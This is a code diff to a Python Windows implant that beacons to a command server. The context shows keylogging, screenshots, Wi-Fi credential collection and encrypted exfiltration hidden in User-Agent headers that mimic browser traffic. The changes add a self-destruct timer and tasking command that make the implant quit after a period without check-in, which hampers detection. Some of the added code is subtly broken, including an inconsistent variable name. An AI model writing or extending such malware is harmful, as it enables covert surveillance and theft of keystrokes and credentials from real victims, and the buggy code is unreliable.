@@ -9,7 +9,7 @@ import subprocess
 import sys
 import threading
 import time
-from datetime import datetime
+from datetime import datetime, timedelta
 import requests
 import win32gui
 from PIL import Image
@@ -34,6 +34,8 @@ klogging = False
 lastActiveWindow = ""
 encrypted = True
 BLOCK_SIZE = 128
+selfdestuct = 168
+hbtime = datetime.now()
 
 #---------------Change Me---------------#
 #-----------b'<32 length key>-----------#
@@ -108,7 +110,7 @@ def connect(url, managementURL):
     sendfilewarning = False
     global klogging
     global keys
-
+    global hbtime
     threadKeystrokes = threading.Thread(target=enableKeylogger)
 
     # Fetch JSON results
@@ -150,6 +152,12 @@ def connect(url, managementURL):
             if cmd.startswith("wificreds:"):
                 decodelist.append(cmd)
 
+            if cmd.startswith("self-destruct:"):
+                global selfdestruct
+                command = cmd.replace("self-destruct:", "")
+                selfdestruct = command
+                return
+
             # Changes implant sleeptime
             if cmd.startswith("stime:"):
                 command = cmd.replace("stime:", "")
@@ -184,8 +192,7 @@ def connect(url, managementURL):
                 sys.exit(1)
 
             if cmd.startswith("solongclean:"):
-                # have implant delete itself
-
+                # have implant delete itself (TODO)
                 sys.exit(1)
 
         command = decodelist[-1]
@@ -287,6 +294,7 @@ def connect(url, managementURL):
     if len(placeholder) > 7000 or sendfilewarning or screenshotwarning:
         split = [placeholder[i:i + 7000] for i in range(0, len(placeholder), 7000)]
         length = len(split)
+        hbtime = datetime.now()
 
         # If data will be sent in over 49 chunks, send warning that output cant be sent
         if len(split) >= 49:
@@ -333,13 +341,13 @@ def connect(url, managementURL):
     # If data is less than above send in one request
     else:
         # Send response back to canary server
+        hbtime = datetime.now()
         try:
             b64 = encrypt(b64)
             headers = {"User-Agent": b64,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
-            # print("[+] Sending chunked data")
 
             if command != "task:" or command != "":
                 response = requests.get(url, headers=headers)
@@ -365,6 +373,7 @@ def main():
     global canaryManagementURL
     global sleepTime
     global jitter
+    global hbtime
     if canaryManagementURL == "":
         canaryManagementURL = input("[+] Enter Management URL: ")
 
@@ -385,7 +394,11 @@ def main():
 
     while True:
         try:
-            # sleep before checking for new tasking. Add jitter if enabled
+            # Check for last checkin time and end if after selfdestruct time
+            if datetime.now() > (hbtime + timedelta(hours=selfdestuct)):
+                sys.exit()
+
+            # sleep before checking for new tasking. Modify with jitter value if enabled
             if float(jitter) <= 0:
                 time.sleep(int(sleepTime))
             else:
@@ -394,7 +407,8 @@ def main():
                 modifiedsleep = random.uniform(-variation, variation)
                 time.sleep(float(sleepTime) + modifiedsleep)
             connect(url, canaryManagementURL)
-        except:
+        except Exception as e:
+            print(e)
             pass
 
 
